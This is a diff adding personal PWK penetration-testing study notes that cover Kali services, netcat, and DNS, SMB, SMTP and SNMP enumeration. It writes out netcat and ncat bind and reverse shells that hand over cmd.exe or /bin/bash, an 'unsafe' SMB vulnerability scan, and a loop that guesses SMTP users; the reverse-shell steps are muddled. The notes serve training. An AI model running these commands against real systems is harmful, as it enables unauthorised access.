@@ -1,0 +1,140 @@
+PWK Notes
+
+Commands
+Man - manual
+locate - find files by name updated by updatedb
+Which - returns the path
+find - search for files in dir (find / -name filename*)
+
+Services
+1) SSH Service - port 22
+service ssh start
+netstat -antp |grep sshd
+service ssh stop 
+
+2) Http Service - Port 80
+service apache2 start
+look in browser -  127.0.0.1
+apache document root - /var/www/index.html
+echo "kali linux rocks" > /var/www/index.html
+service apache2 stop
+
+3) /etc/init.d - service mgmt
+/etc/init.d/ssh start
+/etc/init.d/apache2 restart
+
+4) Service Boot Persistence
+update-rc.d ssh enable
+update-rc.d apache2 enable
+both will be Persist after a reboot
+manage kali services using rcconf & sysv-rc-conf
+
+Netcat - utility to read & write in both tcp & udp(client - server)
+
+Netcat chat 
+Exceuting remote commands
+1) bind shell (windows - kali)
+in windows cmd
+nc -lvp 4444 -e cmd.exe 
+nc -vn ipofwin 4444 
+u can access cmd now
+
+2)Reverse Shell
+in win cmd
+nc -lvp 4444
+in kali
+nc -vn ipofwin 4444 -e /bin/bash
+now wecan access kali in win
+
+netcat is not secured use Ncat
+in win cmd
+ncat -lvp 4444 -e cmd.exe --allow ipofkali --ssl
+inkali
+ncat -v ipofwin 4444 --ssl
+
+Wireshark - packet sniffing 
+
+Information Gathering
+passive infoga using Googlehacking - GHDB
+active infoga 
+1) DNS Enumeration
+to discover nameserver 
+host -t ns megacorpone.com
+to discover mailexchange
+host -t mx megacorpone.com
+to discover ipaddress
+host megacorpone.com
+Forward &  reverse dns lookups (forward.sh & reverse.sh)
+check DNS Zone transfer - DNS Enum tool
+
+Port scanning
+nmap
+network sweeping
+nmap -sT --topports 20 192.168.31.200-250 -oG top-port-sweep.txt
+nmap nse scripts 
+
+SMB Enumeration
+SMB enum - nmap -p139,445 iprange --open
+nmap -p 135,445 --script smb-enum-users ipofwin
+nmap -p 135,445 --script smb-check-vulns --script-args=unsafe=1 ipofwin
+
+nbtscan - netbios scan info 
+check for smb null sessions using below command
+rpcclient -U "" ip 
+
+enum4linux
+enum4linux -v ipofwin
+
+SMTP Enumeration
+nc -nv ipofmailserver 25 [connect tomailserver using netcat in port 25]
+verify the users are exist
+VRFY bob
+returns with 250 2.1.5 <bob@redhat.acme.com>
+VRFY idontexist
+failure with 550 5.1.1 idontexist... user unknown
+
+SMTP enum using bashscripts
+create a list of usernames in users.txt 
+try below command
+for user in $(cat users.txt); do echo VRFY $user |nc -nv -w 1 ipofmailserver 2>/dev/null |grep ^"250";done
+
+we can also use python script for SMTPenum
+
+SNMP Enumeration
+SNMP mibvalues
+cat mib-values
+nmap -sU --open -p 161 iprange --open
+onesixtyone - tool
+cat community
+for ip in $(seq 200 254); do echo 192.168.31.$ip;done > ips
+onesixtyone -c community -i ips
+snmpwalk - tool
+snmpwalk -c public -v1 ip mibvalues
+
+Vulnerability scanning
+Vulnerability scanning with NSE Scripts
+1)scanning for single vulnerability
+nmap -v -p 80 --script http-vuln-cve2010-2861 ip
+2) scanning for multiple vulnerability
+nmap -v -p 80 --script all ip
+
+OpenVAS - Opensource vulnerability scanner
+openvas-setup
+immediate scan
+
+Public exploits
+securityfocus.com
+exploit database
+searchsploit in kali
+
+
+
+
+
+
+
+
+
+
+
+
